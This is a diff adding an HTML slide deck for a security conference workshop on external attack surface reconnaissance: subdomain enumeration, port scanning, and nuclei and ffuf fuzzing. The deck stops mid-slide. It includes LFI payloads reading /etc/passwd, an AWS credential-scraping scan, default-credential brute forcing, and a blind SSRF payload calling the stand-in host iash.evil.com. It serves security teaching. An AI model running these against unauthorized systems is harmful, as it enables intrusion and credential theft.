@@ -1,0 +1,926 @@
+<!doctype html>
+<html lang="en">
+
+	<head>
+		<meta charset="utf-8">
+
+		<title>EASM 🤿</title>
+
+		<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
+		<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+		<link rel="stylesheet" href="dist/reset.css">
+		<link rel="stylesheet" href="dist/reveal.css">
+		<link rel="stylesheet" href="dist/theme/black.css" id="theme">
+		<link rel="stylesheet" href="dist/custom.css">
+
+		<!-- Theme used for syntax highlighting of code -->
+		<link rel="stylesheet" href="plugin/highlight/monokai.css">
+	</head>
+
+	<body>
+
+		<div class="reveal">
+
+			<!-- Any section element inside of this container is displayed as a slide -->
+			<div class="slides">
+				<section>
+					<h1>EASM - A deep 🤿 </h1>
+					<h4>https://disobeyrecon23.github.io</h4>
+				</section>
+				<section>
+					<h1>WHOAMI</h1>
+					<h3>SIX2DEZ</h3>
+					<img src="profile_pic.jpg" style="border-radius:50%;width:20%;"/>
+					<ul>
+						<li style="font-size: 0.7em;">Dad, ethical hacker and bash lover at <img style="vertical-align: middle;width: 4em;margin: 0px;" data-src="visma_logo.png">  Red Team</li>
+						<li style="font-size: 0.7em;">Pentester at Cobalt Core and bug hunter</li>
+						<li style="font-size: 0.7em;">Main FOSS projects: <a href="https://github.com/six2dez/reconftw">reconFTW</a>, <a href="https://github.com/six2dez/OneListForAll">OneListForAll</a>, <a href="https://pentestbook.six2dez.com/">pentest-book</a></li>
+						<li style="font-size: 0.7em;">Into climbing, hiking and anything related to mountains</li>
+						<li style="font-size: 0.7em;"><a href="https://twitter.com/six2dez1">@six2dez1</a> on Twiter, <a href="https://github.com/six2dez">@six2dez</a> almost everywhere else</li>
+					</ul>
+				</section>
+				<section>
+					<h1>WHOAMI</h1>
+					<h3>joohoi</h3>
+          			<img src="joohoi_profile.jpg" style="border-radius:50%;width: 20%;" /><br />
+					<ul>
+						<li>Handwaver at <img style="vertical-align: middle;width: 4em;margin: 0px;" data-src="visma_logo.png"> red team</li>
+						<li>Open source stuff: <strong>acme-dns</strong>, <strong>ffuf</strong>, <strong>certbot</strong></li>
+						<li>Dad, board game geek, brewer</li>
+						<li><a href="https://twitter.com/joohoi">@joohoi</a> everywhere on the inter{webs,tubes,pipes}</li>
+					</ul>
+        		</section>
+				<section>
+					<img src="UpCloud.png" style="width: 30%;background: white;" /><br />
+					<p>You all all have creds thanks to UpCloud. After you log in, read (right?) & accept the <a href="https://upcloud.com/terms-of-service">TOS</a> you should <a href="https://hub.upcloud.com/login">log in</a> and spin up an instance for yourself. All the provided creds are anonymous for now, but in the case you would like to keep on using the account after the event, be sure to add your contact details to the account. Empty ones will be deleted after the event.</p>
+					<p>Create a virtual machine using Ubuntu 22.04 LTS template, and install reconFTW on it so you will have all the tools used in the workshop available for you.</p>
+					<pre data-id="code-animation"><code>apt install git
+git clone https://github.com/six2dez/reconftw
+cd reconftw/
+./install.sh</code></pre>
+				</section>
+
+				<section>
+					<h2>Acquiring target</h2>
+					<section>
+						<p style="font-size: 0.7em;">(a.k.a. horizontal correlation)</p>
+						<img src="https://media.giphy.com/media/3zDdFSPALuCe6C43nM/giphy.gif" width="60%" height="auto"/>
+					</section>
+					<section>
+						<h4>
+							Basic Info Gathering 1/2
+						</h4>
+						<ul>
+							<li style="font-size: 0.7em;">First look to corporate website
+								<ul>
+									<li style="font-size: 0.8em;">About us</li>
+									<li style="font-size: 0.8em;">Contact email</li>
+								</ul>
+							</li>
+							<li style="font-size: 0.7em;"><a href="https://www.exploit-db.com/google-hacking-database">Google</a>/<a href="https://github.com/techgaun/github-dorks/blob/master/github-dorks.txt">Github</a> Dorks</li>
+							<li style="font-size: 0.7em;">Emails, usernames, techs
+								<ul>
+									<li style="font-size: 0.8em;">Metadata on indexed docs</li>
+									<li style="font-size: 0.8em;">Social media accounts</li>
+								</ul>
+							</li>
+							<li style="font-size: 0.7em;">Data breaches</li>
+						</ul>
+						<aside class="notes">
+							metafinder<br>
+							emailfinder<br>
+							https://breachdirectory.org/ + https://hashes.com/en/decrypt/hash
+						</aside>
+					</section>
+					<section>
+						<h4>
+							Basic Info Gathering 2/2
+						</h4>
+						<pre data-id="code-animation"><code>
+			# Metadata finder
+			metafinder -d "target.tld" -l 10 -go -bi -ba -o path
+			
+			# Email finder
+			emailfinder -d "target.tld"
+			
+			# Users/Employees
+			python3 theHarvester.py -d target.tld -b "linkedin"
+
+			# Data breaches for free
+			https://breachdirectory.org/
+			https://hashes.com/en/decrypt/hash
+					</code></pre>
+					</section>
+					<section>
+						<br>
+						<br>
+						<h4>
+							<a href="https://www.crunchbase.com/">Crunchbase</a>
+						</h4>
+						<ul>
+							<li style="font-size: 0.7em;">Merges & Acquisitions</li>
+							<li style="font-size: 0.7em;">Associated domains</li>
+							<li style="font-size: 0.7em;">Historic info</li>
+							<li style="font-size: 0.7em;">Others: tech stack, supply chain</li>
+						</ul>
+						<p>
+							<img src="https://media.giphy.com/media/l1LcbR6oWTJkJllOE/giphy.gif" width="60%" height="auto"/>
+						</p>
+					</section>
+					<section>
+						<br>
+						<h4>
+							ASN recon
+						</h4>
+						<ul>
+							<li style="font-size: 0.7em;">Detect dedicated ASN</li>
+							<li style="font-size: 0.7em;">Expand IP blocks</li>
+							<li style="font-size: 0.7em;">Hosting provider</li>
+							<li style="font-size: 0.7em;">Mapping target's network</li>
+						</ul>
+						<pre data-id="code-animation"><code>
+	# Manual
+	bgp.he.net, ipinfo.io, asnlookup.com
+	
+	# Fetch info from ASN
+	asnmap -i 1.3.3.7 -org GOOGLE -d facebook.com -a AS3941
+	amass intel -org "COMPANY"
+						</code></pre>
+					</section>
+					<section>
+						<h4>
+							Registrants / reverse whois
+						</h4>
+						<p>Owner name, company, email or keyword, recursive relationship because companies use different emails, have different companies name on registry</p>
+						<p>Difficult to automate or fetching blindly from cli. High probability of going out of scope.</p>
+						<ul>
+							<li style="font-size: 0.7em;"><a href="https://viewdns.info/">Viewdns</a></li>
+							<li style="font-size: 0.7em;"><a href="https://www.whoxy.com/">Whoxy</a></li>
+							<li style="font-size: 0.7em;"><a href="https://iqwhois.com/">iqwhois</a></li>
+							<li style="font-size: 0.7em;"><a href="https://www.whoisxmlapi.com/">WhoisXMLAPI</a></li>
+						</ul>
+					</section>
+					<section>
+						<h4>
+							Favicon Hash
+						</h4>
+						<p>Useful for related domains discovery, requires favicon hash calculation and Shodan membership, watch out for redesigns or old logos 😜</p>
+						<pre data-id="code-animation"><code>
+				# Shodan query
+				http.favicon.hash:FAVICONHASH
+
+				# Tool
+				python3 favUp.py -wl web_list.txt -sc
+						</code></pre>
+					</section>
+					<section>
+						<h4>
+							Recursion
+						</h4>
+						<img src="https://media.giphy.com/media/agSmzrhrXNiWA/giphy.gif" width="25%" height="auto"/>
+					</section>
+				</section>
+				<section>
+					<h2>Asset discovery</h2>
+					<section>
+						<p>
+							<img src="https://media.giphy.com/media/YlAuPqtjwlSyzy8PZU/giphy-downsized-large.gif" width="auto" height="auto"/>
+						</p>
+					</section>
+					<section>
+						<h4>
+							Passive subdomain enumeration 1/4
+						</h4>
+						<p>Easy and fast way to recover subdomains but outdated, token expense model on most cases</p>
+						<ul>
+							<li style="font-size: 0.7em;">Third party datasets
+								<ul>
+									<li style="font-size: 0.8em;">Sources (<a href="https://securitytrails.com/">SecurityTrails</a>, <a href="https://censys.io/">Censys</a>, ... <a href="https://docs.google.com/spreadsheets/d/1ssuiovzgvFH2aTK-ymrxy2VezvHw5fnvXxBMH3Jnok4/edit?usp=sharing">+200</a>)</li>
+									<li style="font-size: 0.8em;">Tools (<a href="https://github.com/OWASP/Amass">Amass</a>, <a href="https://github.com/projectdiscovery/subfinder">Subfinder</a>, <a href="https://github.com/tomnomnom/assetfinder">assetfinder</a>)</li>
+								</ul>
+							</li>
+							<li style="font-size: 0.7em;"><a href="https://crt.sh/">Certificate transparency</a></li>
+							<li style="font-size: 0.7em;">Code on version control providers</li>
+						</ul>
+					</section>
+					<section>
+						<h4>
+							Passive subdomain enumeration 2/4
+						</h4>
+						<pre data-id="code-animation"><code>
+					# Amass passive data fetch
+					amass enum -passive -d target.tl	
+					subfinder -d target.tl
+					
+					# Ctfr subdomain search on crtsh
+					python3 ctfr.py -d target.tl
+					
+					# Subdomains from Github
+					github-subdomains -d target.tld -t tokens.txt
+
+					# Subdomains from Github
+					gitlab-subdomains -d target.tld
+						</code></pre>
+					</section>
+					<section>
+						<h4>
+							Passive subdomain enumeration 3/4
+						</h4>
+						<ul>
+							<li style="font-size: 0.7em;">DNS Records</li>
+							<li style="font-size: 0.7em;"><a href="https://builtwith.com/">Analytics</a> <a href="https://osint.sh/analytics/">cross</a> <a href="https://site-overview.com/">referencing</a>
+								<ul>
+									<li style="font-size: 0.8em;">Google Analytics</li>
+									<li style="font-size: 0.8em;">Google Tag Manager</li>
+									<li style="font-size: 0.8em;">Facebook Pixel Tag</li>
+									<li style="font-size: 0.8em;">NewRelic</li>
+								</ul>
+							</li>
+						</ul>
+					</section>
+					<section>
+						<h4>
+							Passive subdomain enumeration 4/4
+						</h4>
+						<pre data-id="code-animation"><code>
+				# Fetching DNS records with dnsx
+				cat subs.txt | dnsx -cname -ns -mx -soa -resp					
+				
+				# Analytics from BuiltWith and HackerTarget
+				cat file.txt | analyticsrelationships 					
+				
+				# Analytics from SpyOnWeb, site-overview.com
+				# 	osint.sh and HackerTarget
+				udon -silent -json -s UA-33427076 | jq -c
+						</code></pre>
+					</section>
+					<section>
+						<h4>Active subdomain enumeration 1/3</h4>
+						<p>High cost of time and resources but unique results</p>
+						<p>Requirements</p>
+							<ul>
+								<li style="font-size: 0.7em;"><a href="https://github.com/trickest/resolvers/blob/main/resolvers.txt">Resolvers?</a></li>
+								<li style="font-size: 0.7em;"><a href="https://github.com/six2dez/resolvers_reconftw/blob/main/resolvers_trusted.txt">Trusted resolvers???</a></li>
+								<li style="font-size: 0.7em;">Bulk DNS resolution (a.k.a. <a href="https://github.com/blechschmidt/massdns">massdns</a>)</li>
+								<li style="font-size: 0.7em;">Wordlists, generic or targeted</li>
+							</ul>
+					</section>
+					<section>
+						<br>
+						<br>
+						<h4>Active subdomain enumeration 2/3</h4>
+							<ul>
+								<li style="font-size: 0.7em;">Generic <a href="https://gist.github.com/six2dez/0e07fd3461338374cc3ef942e1e9ddaf">wordlists</a> bruteforcing</li>
+								<li style="font-size: 0.7em;"><a href="https://gist.github.com/six2dez/942b01af47204958045e7c392c250c86">Permutations</a>
+									<ul>
+										<li style="font-size: 0.8em;">Wordlist generation</li>
+										<li style="font-size: 0.8em;">Regex analysis</li>
+										<li style="font-size: 0.8em;">AI???</li>
+									</ul>
+								</li>
+							</ul>
+							<pre data-id="code-animation"><code>
+		# Gotator wordlist generation
+		gotator -sub subdomains.txt -perm permutations.txt \
+		-depth 1 -numbers 5 -mindup -adv -md > permutations.txt
+
+		# Regulator
+		python3 main.py target.tld subdomains.txt output.rules
+		./make_brute_list.sh output.rules output.brute
+							</code></pre>
+					</section>
+					<section>
+						<br>
+						<h4>
+							Active subdomain enumeration 3/3
+						</h4>
+						<pre data-id="code-animation"><code>
+	# Resolvers generation
+	dnsvalidator -tL https://public-dns.info/nameservers.txt \
+	-thread 200 > resolvers.txt
+	
+	# DNS resolution
+	puredns bruteforce wordlist.txt target.com \
+	-r resolvers.txt --resolvers-trusted res_trusted.txt \
+	-l 1000 --wildcard-tests 10 -w output.txt
+
+	# Amass
+	amass enum -df doms.txt -w subs.txt -aw perms.txt \
+	-rf resolvers.txt -trf res_trust.txt -trqps 400
+						</code></pre>
+						<p style="font-size: 0.7em;">⚠️ You could end DOSing the target</p>
+					</section>
+					<section>
+						<h4>
+							Other techniques
+						</h4>
+						<ul>
+							<li style="font-size: 0.7em;">x509 certificate parsing</li>
+							<li style="font-size: 0.7em;">DNS <a href="https://www.securesystems.de/blog/enhancing-subdomain-enumeration-ents-and-noerror/">NOERROR</a> (nested subdomains)</li>
+						</ul>
+						<pre data-id="code-animation"><code>
+			# x509 subdomain extraction
+			cat subs.txt | tlsx -san -cn -silent -r											
+			
+			# DNS NOERROR
+			echo "random.target.tld" | dnsx -rcode noerror,nxdomain
+			dnsx -d target.tld -rcode noerror -w wordlist.txt
+							</code></pre>
+					</section>
+					<section>
+						<br>
+						<br>
+						<h4>
+							Recursion
+						</h4>
+						<img src="https://media.giphy.com/media/agSmzrhrXNiWA/giphy.gif" width="auto" height="auto"/>
+					</section>
+				</section>
+				<section>
+					<h2>Port scanning & service discovery</h2>
+					<section>
+						<br>
+						<br>
+						<br>
+						<p>
+							<img src="https://media.giphy.com/media/xCwYFe19SldXLrJlwm/giphy.gif" width="auto" height="auto"/>
+						</p>
+					</section>
+					<section>
+						<br>
+						<br>
+						<h4>
+							Fetch hosts
+						</h4>
+						<p>It's essential to resolve IPs to avoid unnecessary DNS resolutions when scanning ports and scanning the same host more than once</p>
+						<ul>
+							<li style="font-size: 0.7em;">DNS resolution of previous step</li>
+							<li style="font-size: 0.7em;">Get IPs from CIDRs or ASN</li>
+						</ul>
+						<pre data-id="code-animation"><code>
+				# Get A/AAAA records from subdomains
+				dnsx -a -aaaa -resp -silent -l subdomains.txt
+				
+				# Expand CIDRs/ASN
+				echo "ASD_OR_CIDR" | mapcidr -silent
+						</code></pre>
+					</section>
+					<section>
+						<br>
+						<h4>
+							Cloud detection
+						</h4>
+						<p style="font-size: 0.7em;"><a href="https://cdn.nuclei.sh/">Cloud IP ranges, WAFs, CDNs</a></p>
+						<p>The goal is skip useless port scans and avoid BAN or blocks</p>
+						<pre data-id="code-animation"><code>
+								# WAF and CDN detection
+								cat list.txt | ipcdn -v
+
+								# Cloud detection by bruteforce
+								python3 cloud_enum.py -k keyword
+						</code></pre>
+					</section>
+					<section>
+						<h4>
+							Passive & active port scanning
+						</h4>
+						<ul>
+							<li style="font-size: 0.7em;">Passive: Shodan cli/smap
+								<ul>
+									<li style="font-size: 0.8em;">Fast</li>
+									<li style="font-size: 0.8em;">No target interaction</li>
+									<li style="font-size: 0.8em;">Outdated</li>
+								</ul>
+							</li>
+							<li style="font-size: 0.7em;">Active: Masscan/nmap
+								<ul>
+									<li style="font-size: 0.8em;">Depending on the run, but slower</li>
+									<li style="font-size: 0.8em;">Noisier as long as you actually scan the target</li>
+									<li style="font-size: 0.8em;">Up-to-date real data</li>
+								</ul>
+							</li>
+						</ul>
+					</section>
+					<section>
+						<br>
+						<h4>
+							Port scanning examples
+						</h4>
+						<pre data-id="code-animation"><code>
+						# Passive ports scan
+						smap -iL targets.txt
+						shodan host 10.X
+
+						# Active ports scan
+						masscan 10.X.X.X -p1-1000
+						nmap -iL targets.txt
+						nmap -iL targets.txt -sV --script vulners 
+							--script-args mincvss=5.0
+						</code></pre>
+
+					</section>
+					<section>
+						<br>
+						<h4>
+							Expand previous steps
+						</h4>
+						<p style="font-size: 0.7em;">Reverse DNS records / PTR</p>
+						<p style="font-size: 0.7em;">⚠️ Really easy to go out of scope (cloud providers, shared hosting, etc)</p>
+						<pre data-id="code-animation"><code>
+				# PTR records
+				cat iplist.txt | dnsx -ptr -retry 3 -silent -resp
+						</code></pre>
+					</section>
+				</section>
+				<section>
+					<h2>Technology inspection</h2>
+					<section>
+						<p>
+							<img src="https://media.giphy.com/media/1uyFaGpt2ilmE/giphy-downsized-large.gif" width="auto" height="auto"/>
+						</p>
+					</section>
+					<section>
+						<h4>
+							Software versions
+						</h4>
+						<ul>
+							<li style="font-size: 0.7em;">Useful for further steps
+								<ul>
+									<li style="font-size: 0.8em;">Targeted attacks</li>
+									<li style="font-size: 0.8em;">Known vulns</li>
+								</ul>
+							</li>
+							<li style="font-size: 0.7em;">Helps to prioritize</li>
+							<li style="font-size: 0.7em;">Level of patching</li>
+						</ul>
+					</section>
+					<section>
+						<h4>
+							Banner grabbing / custom services
+						</h4>
+						<ul>
+							<li style="font-size: 0.7em;">Same as software versions</li>
+							<li style="font-size: 0.7em;">OS Fingerprinting</li>
+							<li style="font-size: 0.7em;">Custom/unknown services == interesting</li>
+						</ul>
+					</section>
+					<section>
+						<h4>
+							CMS, frameworks, WAF
+						</h4>
+						<p style="font-size: 0.7em;">History of known vulnerabilities on different CMSs (WordPress, Drupal), Frameworks (Symfony, Laravel) and common bypasses depending on the WAF</p>
+						<pre data-id="code-animation"><code>
+			# Web tech detection
+			httpx -title -server -tech-detect -cdn -l list.txt
+			
+			# CMS detection
+			python3 cmseek.py -l tartget_list.txt
+			
+			# WAF detection
+			wafw00f -l tartget_list.txt
+						</code></pre>
+					</section>
+					<section>
+						<h4>
+							Visual inspection / web screenshooting
+						</h4>
+						<p style="font-size: 0.7em;">Helps to filter thousand of screenshots and most of the tools provide report</p>
+						<p style="font-size: 0.7em;">We can take advantage of AI to classify sites according to appearance</p>
+						<pre data-id="code-animation"><code>
+			# Web screenshoting
+			gowitness file -f sites.tx			
+
+			# Classify based on given pretrained AI model
+			python3 eyeballer.py --weights model.h5 evaluate /path/
+						</code></pre>
+					</section>
+				</section>
+				<section>
+					<h2>Gathering the low hanging fruit</h2>
+					<section>
+						<br>
+						<br>
+						<p>
+							<img src="https://media.giphy.com/media/0r51Zmo72WICswWagi/giphy.gif" width="auto" height="auto"/>
+						</p>
+					</section>
+					<section>
+						<h4>
+							CVE's and known weaknesses
+						</h4>
+						<ul>
+							<li style="font-size: 0.7em;">CVE Trends</li>
+							<li style="font-size: 0.7em;">Default credentials</li>
+							<li style="font-size: 0.7em;">Easy box HTB-like typical vulns</li>
+						</ul>
+					</section>
+					<section>
+						<br>
+						<br>
+						<br>
+						<h4>
+							Nuclei
+						</h4>
+						<ul>
+							<li style="font-size: 0.7em;">FOSS replacement for vulnerability scanners</li>
+							<li style="font-size: 0.7em;">Templates based</li>
+							<li style="font-size: 0.7em;">Community driven templates</li>
+							<li style="font-size: 0.7em;">From tech detection to critical exploits</li>
+							<li style="font-size: 0.7em;">Easy to start writing your own templates</li>
+						</ul>
+						<pre data-id="code-animation"><code>
+						# Fetch latest templates
+						nuclei -ut						
+						
+						# Scan horizontally for specific CVE
+						cat targets.txt | nuclei -id CVE-2023-1337
+						</code></pre>
+					</section>
+					<section>
+						<h4>
+							Common sensitive files
+						</h4>
+						<ul>
+							<li style="font-size: 0.7em;">Credentials disclosure</li>
+							<li style="font-size: 0.7em;">Sensitive internal information</li>
+							<li style="font-size: 0.7em;">Other assets critical info</li>
+							<li style="font-size: 0.7em;"><a href="https://github.com/six2dez/OneListForAll/blob/main/onelistforallmicro.txt">Juicy files</a>: .conf,.env,.sftp_config,etc</li>
+							<li style="font-size: 0.7em;">PII</li>
+						</ul>
+					</section>
+					<section>
+						<br>
+						<h4>
+							Subdomain takeovers
+						</h4>
+						<p>Misconfigured DNS record pointing to a 3rd party service that can be claimed by anyone.
+						<ul>
+							<li style="font-size: 0.7em;">Forgotten company assets</li>
+							<li style="font-size: 0.7em;">Mainly hidden subdomains on deep levels</li>
+							<li style="font-size: 0.7em;">Impact on brand reputation and users data</li>
+							<li style="font-size: 0.7em;">Most of times requires paid subscription</li>
+							<li style="font-size: 0.7em;"><a href="https://github.com/projectdiscovery/nuclei-templates/tree/main/takeovers">Nuclei templates FTW</a></li>
+							<li style="font-size: 0.7em;">Fix: Take care of your DNS records, periodic cleanup</li>
+						</ul>
+					</section>
+				</section>
+				<section>
+					<h2>Bringing out the guns</h2>
+					<section>
+						<p>
+							<img src="https://media.giphy.com/media/e2Qlt1gyZmFAbOhly4/giphy.gif" width="auto" height="auto"/>
+						</p>
+					</section>
+					<section>
+						<h4>
+							Login bruteforcing/default credentials
+						</h4>
+						<p>Pre-configured technology based attack templates will take you far here.
+						Project Discovery's nuclei has a large template library for default credentials at your disposal.
+						Nuclei templates are pretty straightforward to create on your own in case you want to test a large
+						amount of instances of a specific application.</p>
+
+						<p>Other options include having credential pair wordlists at hand and running them through ffuf. This
+						will require a bit more contextual knowledge (like when creating a nuclei template) and isn't
+						as easily globally automated.</p>
+					</section>
+					<section>
+						<h3>
+							Url collectors: Crawling
+						</h3>
+						<h4>Katana</h4>
+						<p style="font-size: 0.7em;">A web crawler that spits out links found in the site. Has an extensive amount of configuration
+						options to make sure you don't spin out of scope, has abilities to include authentication cookies
+						or other headers, using a headless browser instead of "dumb" html parsing...
+						</p>
+						<pre><code>katana -list url_list.txt -jc -kf -cs target.tld -ef jpg,png</code></pre>
+					</section>
+					<section>
+						<br>
+						<h3>
+							Url collectors: Passive / history
+						</h3>
+						<h4>gau / waymore / github-endpoints</h4>
+						<p style="font-size: 0.7em;">Extract urls given the domain from different third-party services, such as WaybackMachine, VirusTotal or URLScan. Sometimes it is more useful than crawlers/spiders because they can contain GET parameters and give us an idea of how it is used, they can even reveal sensitive information.</p>
+						<pre><code>
+		# gau
+		cat sites.txt | gau
+		# waymore
+		python3 waymore.py -i webs.txt -mode U -f -O file.txt
+		# github-endpoints
+		github-endpoints -d target.tld -t key.txt -o output.txt
+						</code></pre>
+					</section>
+					<section>
+						<h4>
+							Url analysis (<a href="https://github.com/1ndianl33t/Gf-Patterns">gf patterns</a>)
+						</h4>
+						<p>Grep wrapper written Go for url classification and finding potentially vulnerable patterns with regexes</p>
+						<ul>
+							<li style="font-size: 0.7em;">SSRF</li>
+							<li style="font-size: 0.7em;">SQLi</li>
+							<li style="font-size: 0.7em;">base64</li>
+							<li style="font-size: 0.7em;">Extension detection</li>
+						</ul>
+					</section>
+					<section>
+						<h4>
+							Contextual wordlists: target based
+						</h4>
+						<p>You can utilize tools like tomnomnom's <a href="https://github.com/tomnomnom/unfurl">unfurl</a>
+						to extract juicy parts of the crawled urls to create basis for a custom wordlist. Typically interesting things include parameter keys, values, paths etc.</p>
+
+						<p>There are some old and trusty tools like <a href="https://github.com/digininja/CeWL">CeWL</a> for target based wordlist generation from everything
+						on the site.</p>
+					</section>
+					<section>
+						<h4>
+							Contextual wordlists: technology based
+						</h4>
+						<p>OneListForAll has a great collection of <a href="https://github.com/six2dez/OneListForAll/tree/main/dict">wordlists sparated by technologies</a>.</p>
+						<p>Assetnote <a href="https://wordlists.assetnote.io/">hosts a collection</a> of specifically crafted,
+						context based wordlists for anyone to use.</p>
+					</section>
+					<section>
+						<h4>
+							Specific vulnerability scanners
+						</h4>
+						<p>Tools built around a specific technology focused on different concrete vulnerabilities around it</p>
+						<ul>
+							<li style="font-size: 0.7em;">WPScan</li>
+							<li style="font-size: 0.7em;">CMSeek</li>
+							<li style="font-size: 0.7em;">aem-hacker</li>
+							<li style="font-size: 0.7em;">sret</li>
+						</ul>
+					</section>
+					<section>
+						<h4>
+							JS analysis
+						</h4>
+						<p>There is still much room for improvement here, as JS parsing and rendering is difficult to automate</p>
+						<ul>
+							<li style="font-size: 0.7em;"><a href="https://github.com/w9w/JSA">Recursive</a> JS <a href="https://github.com/xnl-h4ck3r/xnLinkFinder">search</a></li>
+							<li style="font-size: 0.7em;">Endpoints collector</li>
+							<li style="font-size: 0.7em;"><a href="https://github.com/projectdiscovery/nuclei-templates/tree/main/exposures">Secrets on JS</a></li>
+						</ul>
+					</section>
+					<section>
+						<h3>Responders: interactsh</h3>
+						<p>This is available as a hosted solution, but you get a lot more out of it when hosting your own instead,
+						and especially when talking about potential vulnerabilities, it's important that you own your data!</p>
+						<p><a href="https://github.com/projectdiscovery/interactsh">https://github.com/projectdiscovery/interactsh</a></p>
+						<p>In order to set one up, you will need a server (VPS) with a static IP address, and a domain name.</p>
+						<p>In context of web application testing, it's most often used just as DNS responder to catch SSRF requests.</p>
+					</section>
+					<section>
+						<h3>Responders: XSSHunter</h3>
+						<p>Here's a great tool for efficient management of XSS vulnerabilities, especially blind XSS. The OG XSSHunter
+						was sundowned just recently and has been succeeded by a slightly modified fork hosted by Trufflesec.</p>
+						<p>To underline "you should really host your own" - stance and data ownership, as of writing this there is
+						ongoing controversy with Trufflesec for farming the hosted XSSHunter database, allegedly for statistics.</p>
+						<p>OG: <a href="https://github.com/mandatoryprogrammer/xsshunter-express">https://github.com/mandatoryprogrammer/xsshunter-express</a></p>
+						<p>Trufflesec fork: <a href="https://github.com/trufflesecurity/xsshunter">https://github.com/trufflesecurity/xsshunter</a></p>
+					</section>
+					<section>
+						<h4>
+							Advanced web fuzzing
+						</h4>
+						<p>A great tool for this purpose is ffuf. It is designed to be very versatile, a swiss army knife type of a web fuzzer.</p>
+						<img src="ffuf_logo.png" style="width: 40%;margin: -30px;">
+						<p>There are couple of examples of automated scans you can do with ffuf, but it does allow you to do much more.
+						For more in-depth walkthrough of the different options available, visit <a href="https://github.com/ffuf/ffuf/wiki">ffuf documentation</a>.</p>
+
+					</section>
+					<section>
+						<h4>Advanced web fuzzing: Credential scraping</h4>
+						<p>Ffuf provides a way to add something called <a href="https://github.com/ffuf/ffuf/wiki/Scraper">scraper rules</a>. These are json files can be placed in $HOME/.config/ffuf/scraper/</p>
+						<p>An example file that can be used in the workshop is provided in <a href="https://github.com/disobeyrecon23/workshop/blob/master/aws_creds.json">git repo</a>. These rules are passively applied to all ffuf scans if you save the file in the global scrapers directory. For one-shot usage, you can just reference a scraper file with -scraperfile cli parameter.</p>
+						<pre data-id="code-animation"><code># mc 999 will disable all output unless a scraper rule is hit
+ffuf -w all_urls.txt -u FUZZ -mc 999 \
+	   -scraperfile aws_creds.json</code></pre>
+					</section>
+					<section>
+						<h4>
+							Advanced web fuzzing: Virtualhosts
+						</h4>
+						<p>Try all the hostnames against all the web hosts, and report all the vhosts getting answered by
+						specific edge servers / load balancers. This can yield some sweet misconfiguration cases.</p>
+						<pre data-id="code-animation"><code>ffuf -w hostnames.txt:VHOST -w hostnames.txt:DOMAIN \
+				-u https://DOMAIN -H "Host: VHOST" -ac -ach
+						</code></pre>
+					</section>
+					<section>
+						<h4>
+							Advanced web fuzzing: Headers (blind)
+						</h4>
+						<p>You can utilize a list of all well-known header keys to fish for different vulnerabilities.
+						Go crazy by including them all in to a single request, or try to be more specific and pick out the exact culprit.</p>
+						<p>XSS (via administrative consoles usually), misconfigured reverse proxies, load balancers and so on.</p>
+						<p>You should have individual ffuf runs for each type that you may need specific matcher / filter in ffuf. For example:
+						timing based filtering for time-based SQLi</p>
+						<pre data-id="code-animation"><code>ffuf -w headernames.txt:HEADERNAME -w payloads.txt:PAYLOAD \
+				-w hostnames.txt:TARGET \
+				-u https://TARGET \
+				-H "HEADERNAME: PAYLOAD"</code></pre>
+					</section>
+					<section>
+						<h4>
+							Advanced web fuzzing: SSTI
+						</h4>
+						<p>Create your own wordlist out of simple-to-fingerprint SSTI payloads. A good resource to start would be
+						<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection">PayloadsAllTheThings</a>
+							SSTI page.</p>
+						<p>Make sure the calculation yields something unique for you that is easy to match against. The typical {{7*7}} might yield a lot
+						of false positives ;)</p>
+						<pre data-id="code-animation"><code>ffuf -w ssti_payloads.txt:SSTI -w get_params.txt:GETPARAM \
+				-w hostnames.txt:TARGET \
+				-u https://TARGET/?GETPARAM=SSTI \
+				-mr 'result_of_your_unique_calculation_here'</code></pre>
+					</section>
+					<section>
+						<h4>
+							Advanced web fuzzing: LFI
+						</h4>
+						<p>You can follow the same principle as with SSTI payloads. This time around you however want to have either multiple ffuf runs
+						with individual matchers in case you are trying to read different well-known files from the filesystem.
+							</p>
+						<p>You can use the
+							<a href="https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt">LFI wordlist</a>
+						by Jhaddix, distributed in SecLists for inspiration.</p>
+						<p>This example uses LFI wordlist for different techniques trying to read /etc/passwd</p>
+						<pre data-id="code-animation"><code>ffuf -w lfi_payloads.txt:LFI -w get_params.txt:GETPARAM \
+				-w hostnames.txt:TARGET \
+				-u https://TARGET/?GETPARAM=LFI \
+				-mr 'root:x:0:0:root'</code></pre>
+					</section>
+					<section>
+						<h4>
+							Blind SSRF payloads
+						</h4>
+						<p>ffuf 2.0 has a reverse-mapping feature called <b>FFUFHASH</b> that allows you to add a unique token
+							to blind SSRF payloads. This works especially well with interactsh. In this oversimplified example we expect
+						you interactsh domain to be <b>iash.evil.com</b>:</p>
+						<pre data-id="code-animation"><code>ffuf -w params.txt -u \
+		https://target.tld/?FUZZ=%2F%2FFFUFHASH.iash.evil.com</code></pre>
+					</section>
+				</section>
+				<section>
+					<h2>Scaling</h2>
+					<section>
+						<img src="https://media.giphy.com/media/6bh9FTTEKdtZe/giphy.gif" />
+					</section>
+					<section>
+						<img src="axiom_banner.png" style="width: 50%;"/>
+						<ul>
+                            <li>The tool splits wordlists and other input methods between the instances in the fleet</li>
+							<li>Results are recovered and stitched back together on the control machine</li>
+							<li><a href="https://github.com/pry0cc/axiom">https://github.com/pry0cc/axiom</a></li>
+                        </ul>
+					</section>
+					<section>
+						<h4>Axiom</h4>
+						<pre><code>
+							# Building the image
+							axiom-build
+							
+							# Spin up the fleet
+							axiom-fleet "1337squadron" -i 50
+							
+							# Scanning
+							axiom-scan input.txt -m ffuf -o output.txt 
+
+							# Deleting the fleet
+							axiom-rm -f "\*"
+						</code></pre>
+						<p style="font-size: 0.7em;">⚠️ High DDOS risk</p>
+					</section>
+					<section>
+						<img src="serverless.jpeg" style="width: 30%"/>
+						<ul>
+                            <li>Scales infinitely, but can get pricy</li>
+							<li>Spawn thousands of worker functions to cover the surface extremely fast</li>
+							<li><a href="https://github.com/fyoorer/ShadowClone">https://github.com/fyoorer/ShadowClone</a></li>
+                        </ul>
+					</section>
+					<section>
+						<h4>Shadowclone</h4>
+						<ul>
+                            <li>Set up: <a href="https://github.com/fyoorer/ShadowClone/wiki">https://github.com/fyoorer/ShadowClone/wiki</a></li>
+							<li>Note: the AWS policy you create needs to also have the "iam:PassRole"</li>
